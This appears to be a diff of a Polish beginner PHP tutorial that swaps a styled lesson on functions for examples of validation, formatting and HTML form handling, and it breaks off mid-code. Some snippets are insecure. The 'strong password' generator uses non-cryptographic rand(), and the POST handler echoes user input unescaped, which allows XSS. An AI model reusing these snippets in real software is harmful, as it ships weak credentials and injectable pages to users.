-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600;">Przykład</th>
-      <th style="padding: 12px 16px; text-align: left; color: #495057; font-weight: 600; width: 100px;">Wynik</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px; font-weight: 600;">count()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Liczy elementy tablicy</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">count([1, 2, 3])</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px;">3</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px; font-weight: 600;">array_push()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Dodaje element na koniec tablicy</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">array_push($tab, "nowy")</code></td>
-      <td style="padding: 12px 16px; color: #666; font-style: italic;">Dodaje element</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px; font-weight: 600;">in_array()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Sprawdza, czy element jest w tablicy</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">in_array("PHP", ["PHP", "JS"])</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px;">true</code></td>
-    </tr>
-    <tr>
-      <td style="padding: 12px 16px;"><code style="background: #e8f5e9; color: #2e7d32; padding: 4px 6px; border-radius: 4px; font-weight: 600;">array_merge()</code></td>
-      <td style="padding: 12px 16px; color: #555;">Łączy dwie tablice</td>
-      <td style="padding: 12px 16px;"><code style="background: #f8f9fa; padding: 4px 6px; border-radius: 4px;">array_merge([1,2], [3,4])</code></td>
-      <td style="padding: 12px 16px;"><code style="background: #e3f2fd; color: #1565c0; padding: 4px 6px; border-radius: 4px;">[1,2,3,4]</code></td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
-#### 💻 Przykład użycia:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-$jezyki = ["PHP", "JavaScript"];
-array_push($jezyki, "Python");
-echo count($jezyki); // Wyświetli: 3
-if (in_array("PHP", $jezyki)) {
-    echo "PHP jest na liście!";
-} // Wyświetli: PHP jest na liście!
-?>
-```
-
-</div>
-
-<div style="background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%); border-left: 5px solid #4caf50; padding: 16px; border-radius: 10px; margin: 20px 0;">
-<h4 style="margin-top: 0; color: #2e7d32; display: flex; align-items: center; gap: 8px;"><span style="font-size: 18px;">💡</span> Porada</h4>
-<p style="color: #2e7d32; margin: 0; font-size: 16px; line-height: 1.6;">Zaglądaj do dokumentacji PHP na <a href="https://www.php.net/manual" style="color: #1976d2; text-decoration: none; font-weight: 600;">php.net</a>. Znajdziesz tam opisy wszystkich wbudowanych funkcji z przykładami!</p>
-</div>
-
----
-
-## **Praktyczne przykłady funkcji**
-
-<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 12px; margin: 25px 0; text-align: center;">
-<h3 style="margin: 0 0 10px 0; font-size: 20px;">🚀 Przykłady z prawdziwego świata</h3>
-<p style="margin: 0; font-size: 16px; opacity: 0.9;">Poznaj praktyczne zastosowania funkcji w rzeczywistych projektach!</p>
-</div>
-
-### 🛒 Przykład 1: Kalkulator rabatu
-
-Stwórzmy funkcję, która oblicza cenę po rabacie:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-function obliczCenePoRabacie($cena, $rabatProcent) {
-    $rabat = $cena * ($rabatProcent / 100);
-    return $cena - $rabat;
-}
-
-$produkt = 200; // Cena początkowa
-$rabat = 20; // 20% rabatu
-$cenaKoncowa = obliczCenePoRabacie($produkt, $rabat);
-echo "Cena po rabacie: $cenaKoncowa zł"; // Wyświetli: Cena po rabacie: 160 zł
-?>
-```
-
-</div>
-
-### 👤 Przykład 2: Formatowanie imienia i nazwiska
-
-Funkcja, która formatuje imię i nazwisko:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-function formatujImieNazwisko($imie, $nazwisko) {
-    $imie = ucfirst(strtolower($imie)); // Pierwsza litera wielka, reszta mała
-    $nazwisko = ucfirst(strtolower($nazwisko));
-    return "$imie $nazwisko";
-}
-
-echo formatujImieNazwisko("jan", "KOWALSKI"); // Wyświetli: Jan Kowalski
-?>
-```
-
-</div>
-
-### 🔐 Przykład 3: Sprawdzanie hasła
-
-Funkcja sprawdzająca, czy hasło jest wystarczająco długie:
-
-<div style="background: #2d3748; border-radius: 10px; padding: 20px; margin: 20px 0; position: relative;">
-<div style="position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #cbd5e0;">PHP</div>
-
-```php
-<?php
-function sprawdzHaslo($haslo, $minDlugosc = 8) {
-    if (strlen($haslo) >= $minDlugosc) {
-        return "Hasło jest wystarczająco długie!";
-    } else {
-        return "Hasło za krótkie! Minimum $minDlugosc znaków.";
-    }
-}
-
-echo sprawdzHaslo("tajne123"); // Wyświetli: Hasło jest wystarczająco długie!
-echo sprawdzHaslo("krótki"); // Wyświetli: Hasło za krótkie! Minimum 8 znaków.
-?>
-```
-
-</div>
-
----
-
-## **Najlepsze praktyki przy pracy z funkcjami**
-
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 25px; margin: 30px 0;">
-    <div style="background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%); border-radius: 12px; padding: 20px; box-shadow: 0 6px 20px rgba(76, 175, 80, 0.2);">
-        <h4 style="color: #2e7d32; margin-top: 0; font-size: 18px; display: flex; align-items: center; gap: 8px;">
-            <span style="font-size: 24px;">✅</span> Co robić
-        </h4>
-        <ul style="color: #2e7d32; line-height: 1.6; margin: 0; padding-left: 20px;">
-            <li style="margin-bottom: 8px;">Nadawaj funkcjom jasne, opisowe nazwy</li>
-            <li style="margin-bottom: 8px;">Używaj parametrów z wartościami domyślnymi, gdy to ma sens</li>
-            <li style="margin-bottom: 8px;">Zawsze dokumentuj, co robi funkcja</li>
-            <li style="margin-bottom: 8px;">Sprawdzaj poprawność danych wejściowych w funkcji</li>
-            <li style="margin-bottom: 0;">Używaj <code style="background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 4px;">return</code> zamiast <code style="background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 4px;">echo</code>, jeśli funkcja ma zwracać wynik</li>
-        </ul>
-    </div>
     
-<div style="background: linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%); border-radius: 12px; padding: 20px; box-shadow: 0 6px 20px rgba(244, 67, 54, 0.2);">
-        <h4 style="color: #c62828; margin-top: 0; font-size: 18px; display: flex; align-items: center; gap: 8px;">
-            <span style="font-size: 24px;">❌</span> Czego unikać
-        </h4>
-        <ul style="color: #c62828; line-height: 1.6; margin: 0; padding-left: 20px;">
-            <li style="margin-bottom: 8px;">Pisania zbyt długich funkcji – powinny robić jedną rzecz i robić to dobrze</li>
-            <li style="margin-bottom: 8px;">Mieszania <code style="background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 4px;">echo</code> i <code style="background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 4px;">return</code> w tej samej funkcji</li>
-            <li style="margin-bottom: 8px;">Tworzenia funkcji bez parametrów, jeśli można je uogólnić</li>
-            <li style="margin-bottom: 0;">Ignorowania wbudowanych funkcji PHP</li>
-        </ul>
-    </div>
-</div>
+    function walidujEmail($email) {
+        $email = trim($email);
+        
+        if (empty($email)) {
+            return "Email nie może być pusty";
+        }
+        
+        if (!czyEmailPoprawny($email)) {
+            return "Nieprawidłowy format email";
+        }
+        
+        return true;  // Email poprawny
+    }
+    
+    $wynik = walidujEmail("test@example.com");
+    if ($wynik === true) {
+        echo "Email poprawny!";
+    } else {
+        echo "Błąd: $wynik";
+    }
+?>
+```
+
+#### **Przykład 3: Generowanie silnego hasła**
+
+```php
+<?php
+    function generujHaslo($dlugosc = 12) {
+        $znaki = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+        $haslo = "";
+        $maxIndex = strlen($znaki) - 1;
+        
+        for ($i = 0; $i < $dlugosc; $i++) {
+            $haslo .= $znaki[rand(0, $maxIndex)];
+        }
+        
+        return $haslo;
+    }
+    
+    echo generujHaslo();      // np. aB3!xY9@kL2#
+    echo generujHaslo(20);    // Dłuższe hasło
+?>
+```
+
+#### **Przykład 4: Formatowanie ceny**
+
+```php
+<?php
+    function formatujCene($cena, $waluta = "PLN") {
+        $cenaFormatowana = number_format($cena, 2, ',', ' ');
+        
+        switch ($waluta) {
+            case "PLN":
+                return $cenaFormatowana . " zł";
+            case "EUR":
+                return "€" . $cenaFormatowana;
+            case "USD":
+                return "$" . $cenaFormatowana;
+            default:
+                return $cenaFormatowana . " " . $waluta;
+        }
+    }
+    
+    echo formatujCene(1234.56);         // 1 234,56 zł
+    echo formatujCene(1234.56, "EUR");  // €1 234,56
+    echo formatujCene(1234.56, "USD");  // $1 234,56
+?>
+```
+
+#### **Przykład 5: Slug dla URL**
+
+```php
+<?php
+    function utworzSlug($tekst) {
+        // Zamiana na małe litery
+        $slug = strtolower($tekst);
+        
+        // Zamiana polskich znaków
+        $zamiana = [
+            'ą' => 'a', 'ć' => 'c', 'ę' => 'e', 'ł' => 'l',
+            'ń' => 'n', 'ó' => 'o', 'ś' => 's', 'ź' => 'z', 'ż' => 'z'
+        ];
+        $slug = strtr($slug, $zamiana);
+        
+        // Usunięcie wszystkiego oprócz liter, cyfr i spacji
+        $slug = preg_replace('/[^a-z0-9\s]/', '', $slug);
+        
+        // Zamiana spacji na myślniki
+        $slug = preg_replace('/\s+/', '-', $slug);
+        
+        // Usunięcie podwójnych myślników
+        $slug = preg_replace('/-+/', '-', $slug);
+        
+        // Usunięcie myślników z początku i końca
+        $slug = trim($slug, '-');
+        
+        return $slug;
+    }
+    
+    echo utworzSlug("To jest tytuł artykułu!");
+    // to-jest-tytul-artykulu
+    
+    echo utworzSlug("Żółta łódka płynie");
+    // zolta-lodka-plynie
+?>
+```
 
 ---
 
-## **Typowe błędy i jak ich unikać**
+## **9. Formularze - komunikacja z użytkownikiem**
 
-<div style="background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%); color: white; padding: 20px; border-radius: 12px; margin: 25px 0; text-align: center;">
-<h3 style="margin: 0 0 10px 0; font-size: 20px;">⚠️ Pułapki dla początkucych</h3>
-<p style="margin: 0; font-size: 16px; opacity: 0.9;">Poznaj najczęstsze błędy i naucz się ich unikać!</p>
-</div>
+Formularze HTML pozwalają użytkownikom wysyłać dane do serwera, gdzie PHP może je przetworzyć.
 
-### 🚫 1. Zapominanie o `return`
-
-<div style="background: white; border-radius: 10px; padding: 20px; margin: 20px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
-<div style="display: flex; gap: 20px; align-items: flex-start;">
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #e74c3c; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>❌</span> ZŁY PRZYKŁAD
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">zlyPrzyklad</span>(<span style="color: #f06292;">$a</span>, <span style="color: #f06292;">$b</span>) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #f06292;">$suma</span> = <span style="color: #f06292;">$a</span> + <span style="color: #f06292;">$b</span>;<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #66bb6a;">// Brak return - funkcja nic nie zwraca!</span><br>
-}<br>
-<span style="color: #f06292;">$wynik</span> = <span style="color: #ffb74d;">zlyPrzyklad</span>(<span style="color: #42a5f5;">2</span>, <span style="color: #42a5f5;">3</span>);<br>
-<span style="color: #64b5f6;">echo</span> <span style="color: #f06292;">$wynik</span>; <span style="color: #66bb6a;">// Nic nie wyświetli!</span><br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #27ae60; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>✅</span> POPRAWNE ROZWIĄZANIE
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">dobryPrzyklad</span>(<span style="color: #f06292;">$a</span>, <span style="color: #f06292;">$b</span>) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #f06292;">$suma</span> = <span style="color: #f06292;">$a</span> + <span style="color: #f06292;">$b</span>;<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #64b5f6;">return</span> <span style="color: #f06292;">$suma</span>; <span style="color: #66bb6a;">// Zawsze używaj return!</span><br>
-}<br>
-<span style="color: #f06292;">$wynik</span> = <span style="color: #ffb74d;">dobryPrzyklad</span>(<span style="color: #42a5f5;">2</span>, <span style="color: #42a5f5;">3</span>);<br>
-<span style="color: #64b5f6;">echo</span> <span style="color: #f06292;">$wynik</span>; <span style="color: #66bb6a;">// Wyświetli: 5</span><br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-</div>
-</div>
-
-### 🚫 2. Nieprawidłowe nazwy parametrów
-
-<div style="background: white; border-radius: 10px; padding: 20px; margin: 20px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
-<div style="display: flex; gap: 20px; align-items: flex-start;">
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #e74c3c; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>❌</span> PROBLEM
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">dodaj</span>(<span style="color: #f06292;">$x</span>, <span style="color: #f06292;">$y</span>) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #64b5f6;">return</span> <span style="color: #f06292;">$x</span> + <span style="color: #f06292;">$y</span>;<br>
-}<br>
-<span style="color: #64b5f6;">echo</span> <span style="color: #ffb74d;">dodaj</span>(<span style="color: #42a5f5;">5</span>); <span style="color: #66bb6a;">// Błąd: brak drugiego parametru!</span><br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #27ae60; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>✅</span> ROZWIĄZANIE
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">dodajBezpieczne</span>(<span style="color: #f06292;">$x</span>, <span style="color: #f06292;">$y</span> = <span style="color: #42a5f5;">0</span>) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #64b5f6;">return</span> <span style="color: #f06292;">$x</span> + <span style="color: #f06292;">$y</span>; <span style="color: #66bb6a;">// Ustaw wartości domyślne</span><br>
-}<br>
-<span style="color: #64b5f6;">echo</span> <span style="color: #ffb74d;">dodajBezpieczne</span>(<span style="color: #42a5f5;">5</span>); <span style="color: #66bb6a;">// Wyświetli: 5</span><br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-</div>
-</div>
-
-### 🚫 3. Zbyt skomplikowane funkcje
-
-<div style="background: white; border-radius: 10px; padding: 20px; margin: 20px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
-<div style="display: flex; gap: 20px; align-items: flex-start;">
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #e74c3c; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>❌</span> ŹLE - funkcja robi za dużo
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">zrobWszystko</span>(<span style="color: #f06292;">$dane</span>) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #66bb6a;">// 100 linii kodu robiących wszystko...</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #66bb6a;">// Walidacja, przetwarzanie, zapis...</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #66bb6a;">// Bardzo trudne do utrzymania!</span><br>
-}<br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-<div style="flex: 1; min-width: 0;">
-<h5 style="color: #27ae60; margin-top: 0; display: flex; align-items: center; gap: 8px;">
-<span>✅</span> DOBRZE - podzielone na mniejsze funkcje
-</h5>
-
-<div style="background: #2d3748; border-radius: 8px; padding: 16px; margin: 10px 0;">
-<div style="color: #cbd5e0; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.4;">
-<span style="color: #81c784;">&lt;?php</span><br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">walidujDane</span>(<span style="color: #f06292;">$dane</span>) { <span style="color: #66bb6a;">/* ... */</span> }<br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">przetworzDane</span>(<span style="color: #f06292;">$dane</span>) { <span style="color: #66bb6a;">/* ... */</span> }<br>
-<span style="color: #64b5f6;">function</span> <span style="color: #ffb74d;">zapiszDane</span>(<span style="color: #f06292;">$dane</span>) { <span style="color: #66bb6a;">/* ... */</span> }<br>
-<br>
-<span style="color: #66bb6a;">// Każda funkcja ma jedno zadanie!</span><br>
-<span style="color: #81c784;">?&gt;</span>
-</div>
-</div>
-
-</div>
-
-</div>
-</div>
-
----
-
-## **Zadania do ćwiczeń**
-
-<div style="background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); padding: 20px; border-radius: 12px; margin: 25px 0;">
-<h3 style="margin: 0 0 15px 0; color: #2d3436; font-size: 20px; text-align: center;">🏋️ Czas na praktykę!</h3>
-<p style="margin: 0; color: #2d3436; text-align: center; font-size: 16px;">Sprawdź swoją wiedzę wykonując poniższe zadania</p>
-</div>
-
-<div style="background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.1); margin: 25px 0;">
-<table style="width: 100%; border-collapse: collapse;">
-  <thead>
-    <tr style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
-      <th style="padding: 16px 20px; text-align: left; font-weight: 600; width: 200px;">Zadanie</th>
-      <th style="padding: 16px 20px; text-align: left; font-weight: 600;">Opis</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #6f42c1;">📐 1. Pole koła</td>
-      <td style="padding: 16px 20px; color: #555;">Napisz funkcję <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px;">poleKola($promien)</code>, która oblicza pole koła (wzór: π × r²). Użyj stałej <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px;">M_PI</code> w PHP.</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #f0f0f0;">
-      <td style="padding: 16px 20px; font-weight: 600; color: #e74c3c;">📧 2. Walidacja email</td>
-      <td style="padding: 16px 20px; color: #555;">Stwórz funkcję <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px;">sprawdzEmail($email)</code>, która sprawdza, czy podany email zawiera znak <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px;">@</code> (użyj <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px">strpos()</code>).</td>
-    </tr>
-    <tr>
-      <td style="padding: 16px 20px; font-weight: 600; color: #27ae60;">📝 3. Generator listy HTML</td>
-      <td style="padding: 16px 20px; color: #555;">Napisz funkcję <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px;">generujListe($elementy)</code>, która przyjmuje tablicę i zwraca HTML w postaci listy <code style="background: #f8f9fa; padding: 2px 6px; border-radius: 4px; font-size: 12px;">&lt;ul&gt;&lt;li&gt;element&lt;/li&gt;...&lt;/ul&gt;</code>.</td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
----
-
-## **Podsumowanie**
-
-<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 15px; margin: 30px 0; text-align: center; position: relative; overflow: hidden;">
-<div style="position: absolute; top: -50px; right: -50px; width: 100px; height: 100px; background: rgba(255,255,255,0.1); border-radius: 50%;"></div>
-<div style="position: absolute; bottom: -30px; left: -30px; width: 60px; height: 60px; background: rgba(255,255,255,0.1); border-radius: 50%;"></div>
-<h3 style="margin: 0 0 15px 0; font-size: 24px; position: relative;">🎯 Najważniejsze wnioski</h3>
-<p style="margin: 0 0 20px 0; font-size: 18px; opacity: 0.95; position: relative;">Gratulacje! Właśnie opanowałeś sztukę tworzenia funkcji w PHP!</p>
-</div>
-
-<div style="background: white; border-radius: 15px; padding: 25px; margin: 25px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
-
-<div style="text-align: center; padding: 20px;">
-<div style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 24px;">🔧</div>
-<h4 style="margin: 0 0 10px 0; color: #2d3436;">Reużywalne bloki kodu</h4>
-<p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">Funkcje pozwalają na wielokrotne wykorzystanie tego samego kodu</p>
-</div>
-
-<div style="text-align: center; padding: 20px;">
-<div style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 24px;">🧩</div>
-<h4 style="margin: 0 0 10px 0; color: #2d3436;">Organizacja kodu</h4>
-<p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">Dzielenie programu na mniejsze, czytelne części</p>
-</div>
-
-<div style="text-align: center; padding: 20px;">
-<div style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 24px;">⚡</div>
-<h4 style="margin: 0 0 10px 0; color: #2d3436;">Wbudowane funkcje PHP</h4>
-<p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">Setki gotowych narzędzi przyspieszających pracę</p>
-</div>
-
-<div style="text-align: center; padding: 20px;">
-<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; color: white; font-size: 24px;">🚀</div>
-<h4 style="margin: 0 0 10px 0; color: #2d3436;">Czysty kod</h4>
-<p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">Unikanie powtórzeń i błędów w kodzie</p>
-</div>
-
-</div>
-
-<div style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 20px; border-radius: 10px; margin-top: 25px; text-align: center;">
-<p style="margin: 0; font-size: 16px; font-weight: 500;">🎓 <strong>Praktykuj pisanie funkcji</strong>, zaczynając od prostych przykładów, takich jak obliczanie cen czy formatowanie tekstu. Z czasem zaczniesz używać ich do bardziej złożonych zadań, jak budowa aplikacji webowych!</p>
-</div>
-</div>
-
-<div style="background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); border-left: 5px solid #00bcd4; padding: 20px; border-radius: 10px; margin: 25px 0;">
-<h4 style="margin-top: 0; color: #006064; display: flex; align-items: center; gap: 8px; font-size: 18px;"><span style="font-size: 22px;">💡</span> Wskazówka na zakończenie</h4>
-<p style="color: #006064; margin: 0; font-size: 16px; line-height: 1.6;">Zaglądaj do dokumentacji PHP i eksperymentuj z przykładami. Tworzenie własnych funkcji to świetny sposób, by stać się lepszym programistą! Pamiętaj: najlepsza nauka to praktyka! 🚀</p>
-</div>
-
-## **9. Obsługa formularzy - Komunikacja z użytkownikiem**
-
-<div style="background-color: #E0F7FA; border-left: 5px solid #00BCD4; padding: 10px;">
-<p style="color: #333333;">Formularze to podstawowy sposób komunikacji między użytkownikiem a aplikacją webową. Pozwalają zbierać dane od użytkowników, które następnie mogą być przetwarzane przez PHP.</p>
-</div>
-
-### Metody przesyłania danych
-
-<table>
-  <tr>
-    <th width="100px">Metoda</th>
-    <th>Charakterystyka</th>
-    <th>Kiedy używać?</th>
-  </tr>
-  <tr>
-    <td><code>POST</code></td>
-    <td>
-      • Dane niewidoczne w URL<br>
-      • Większy limit rozmiaru danych<br>
-      • Większe bezpieczeństwo
-    </td>
-    <td>
-      • Logowanie, rejestracja<br>
-      • Wysyłanie poufnych danych<br>
-      • Formularze zmieniające dane<br>
-      • Upload plików
-    </td>
-  </tr>
-  <tr>
-    <td><code>GET</code></td>
-    <td>
-      • Dane widoczne w URL (parametry)<br>
-      • Limit długości URL<br>
-      • Można dodać do zakładek
-    </td>
-    <td>
-      • Wyszukiwarki<br>
-      • Filtry i sortowanie<br>
-      • Paginacja (podział na strony)<br>
-      • Linki, które można udostępniać
-    </td>
-  </tr>
-</table>
-
-### Formularz HTML
+### **Podstawowy formularz HTML**
 
 ```html
-<form action="proces.php" method="POST">
-  <div>
-    <label>Imię:</label>
-    <input type="text" name="imie" placeholder="Twoje imię" required />
-  </div>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Formularz</title>
+</head>
+<body>
+    <form method="POST" action="przetwarzanie.php">
+        <label>Imię:</label>
+        <input type="text" name="imie" required>
+        <br><br>
+        
+        <label>Email:</label>
+        <input type="email" name="email" required>
+        <br><br>
+        
+        <label>Wiek:</label>
+        <input type="number" name="wiek" min="1" max="150">
+        <br><br>
+        
+        <button type="submit">Wyślij</button>
+    </form>
+</body>
+</html>
+```
 
-  <div>
-    <label>Email:</label>
-    <input type="email" name="email" placeholder="twoj@email.com" required />
-  </div>
+**Ważne atrybuty:**
+- `method` - metoda wysyłania (POST lub GET)
+- `action` - plik PHP, który przetworzy dane
+- `name` - nazwa pola (używana w PHP do odczytu)
 
-  <div>
-    <label>Wiek:</label>
-    <input type="number" name="wiek" min="0" max="120" />
-  </div>
+### **Odbieranie danych - metoda POST**
 
-  <div>
-    <label>Wiadomość:</label>
-    <textarea name="wiadomosc" rows="4"></textarea>
-  </div>
+Plik `przetwarzanie.php`:
 
-  <button type="submit">Wyślij</button>
+```php
+<?php
+    // Sprawdzenie czy formularz został wysłany
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        // Odbieranie danych
+        $imie = $_POST["imie"];
+        $email = $_POST["email"];
+        $wiek = $_POST["wiek"];
+        
+        // Wyświetlenie
+        echo "<h2>Otrzymane dane:</h2>";
+        echo "Imię: $imie<br>";
+        echo "Email: $email<br>";
+        echo "Wiek: $wiek lat<br>";
+    } else {
+        echo "Formularz nie został wysłany metodą POST";
+    }
+?>
+```
+
+### **Metoda GET vs POST**
+
+#### **GET - dane w URL**
+
+```html
+<form method="GET" action="szukaj.php">
+    <input type="text" name="fraza" placeholder="Szukaj...">
+    <button type="submit">Szukaj</button>
 </form>
 ```
 
-<div style="background-color: #FFF3CD; border-left: 5px solid #FFC107; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ WAŻNE!</h4>
-<ul style="color: #333333;">
-<li>Atrybut <code>name</code> jest kluczowy - określa nazwę zmiennej w PHP</li>
-<li>Atrybut <code>action</code> określa plik PHP, który odbierze dane</li>
-<li>Atrybut <code>method</code> określa sposób przesyłania danych</li>
-</ul>
-</div>
+```php
+<?php
+    // szukaj.php
